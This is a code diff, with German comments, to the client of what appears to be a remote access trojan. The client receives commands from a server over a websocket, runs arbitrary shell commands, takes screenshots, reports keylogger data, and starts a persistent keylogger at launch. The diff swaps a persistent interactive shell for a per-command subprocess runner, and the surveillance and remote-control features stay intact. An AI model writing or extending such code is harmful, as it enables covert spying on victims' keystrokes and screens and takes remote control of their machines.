@@ -19,7 +19,6 @@ import time
 from datetime import datetime
 import browserhistory as bh
 import psutil
-import pygetwindow as gw
 import pyautogui
 
 # --- Konfiguration & Globals ---
@@ -637,74 +636,32 @@ def list_webcams() -> str:
     except Exception as e:
         return f"Fehler beim Auflisten der Webcams: {e}"
 
-# === Interaktive Shell ===
-class InteractiveShell:
-    def __init__(self):
-        self._process = None
-        self._running = False
-
-    async def start(self):
-        if self._running:
-            return "Shell läuft bereits."
-        
-        self._running = True
-        shell_cmd = 'cmd.exe' if platform.system() == "Windows" else '/bin/bash'
-        
-        self._process = await asyncio.create_subprocess_shell(
-            shell_cmd,
-            stdin=asyncio.subprocess.PIPE,
+# === Hauptlogik: Befehlsverarbeitung ===
+async def run_shell_command(command: str) -> str:
+    """Führt einen Shell-Befehl aus und gibt die Ausgabe zurück."""
+    try:
+        # Führe den Befehl in der aktuellen CWD aus
+        proc = await asyncio.create_subprocess_shell(
+            command,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
-            cwd=os.getcwd() # Start im aktuellen Verzeichnis
+            cwd=os.getcwd() # Wichtig, um den Zustand von 'cd' zu respektieren
         )
-        return f"Interaktive Shell gestartet (PID: {self._process.pid})."
-
-    async def execute(self, command: str) -> str:
-        if not self._running or not self._process:
-            return "Fehler: Shell läuft nicht."
         
-        try:
-            # Befehl an die Shell senden
-            self._process.stdin.write(f"{command}\n".encode())
-            await self._process.stdin.drain()
+        stdout, stderr = await proc.communicate()
+        
+        output = ""
+        if stdout:
+            output += stdout.decode(errors='ignore')
+        if stderr:
+            output += stderr.decode(errors='ignore')
             
-            # Warte auf eine kurze Zeit, um die Ausgabe zu sammeln
-            await asyncio.sleep(0.5)
-            
-            # Lese die Ausgabe ohne zu blockieren
-            output = ""
-            while True:
-                try:
-                    line = await asyncio.wait_for(self._process.stdout.readline(), timeout=0.1)
-                    if not line: break
-                    output += line.decode(errors='ignore')
-                except asyncio.TimeoutError:
-                    break
-            
-            # Lese auch stderr
-            stderr_output = ""
-            while True:
-                try:
-                    line = await asyncio.wait_for(self._process.stderr.readline(), timeout=0.1)
-                    if not line: break
-                    stderr_output += line.decode(errors='ignore')
-                except asyncio.TimeoutError:
-                    break
-
-            return output + stderr_output if output or stderr_output else "Befehl ausgeführt."
-
-        except Exception as e:
-            return f"Fehler bei der Shell-Ausführung: {e}"
-
-    def stop(self):
-        if self._process:
-            self._process.terminate()
-        self._running = False
-        return "Shell beendet."
-
-interactive_shell = InteractiveShell()
-
-# === Hauptlogik: Befehlsverarbeitung ===
+        return output if output else f"Befehl '{command}' ausgeführt (keine Ausgabe)."
+        
+    except FileNotFoundError:
+        return f"Fehler: Befehl oder Shell nicht gefunden. Ist die PATH-Variable korrekt?"
+    except Exception as e:
+        return f"Fehler bei der Ausführung von '{command}': {e}"
 async def process_commands(websocket: websockets.ClientConnection):
     async for message in websocket:
         try:
@@ -716,7 +673,7 @@ async def process_commands(websocket: websockets.ClientConnection):
             output = None
 
             if action == "exec":
-                output = await interactive_shell.execute(command.get("command"))
+                output = await run_shell_command(command.get("command"))
             elif action == "screenshot":
                 with mss.mss() as sct:
                     sct_img = sct.grab(sct.monitors[1])
@@ -756,14 +713,6 @@ async def process_commands(websocket: websockets.ClientConnection):
                 await websocket.send(json.dumps({"type": "command_output", "output": output}))
                 await websocket.close()
                 sys.exit(0) # Beendet den Client-Prozess
-            elif action == "shell":
-                cmd_to_run = command.get("command")
-                if cmd_to_run == "start":
-                    output = await interactive_shell.start()
-                elif cmd_to_run == "stop":
-                    output = interactive_shell.stop()
-                else:
-                    output = await interactive_shell.execute(cmd_to_run)
             elif action == "keylogger":
                 if not keyboard or not os.path.exists(KEYLOG_FILE_PATH):
                     output = "Keylogger nicht verfügbar oder keine Daten."
@@ -807,9 +756,6 @@ async def connect_to_server():
     load_cwd_state()
     start_persistent_keylogger()
     
-    # Starte die interaktive Shell beim Client-Start
-    await interactive_shell.start()
-    
     backoff_time = 5
     while True:
         try:
@@ -839,4 +785,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         logging.info("Client manuell beendet.")
     finally:
-        interactive_shell.stop()
+        pass
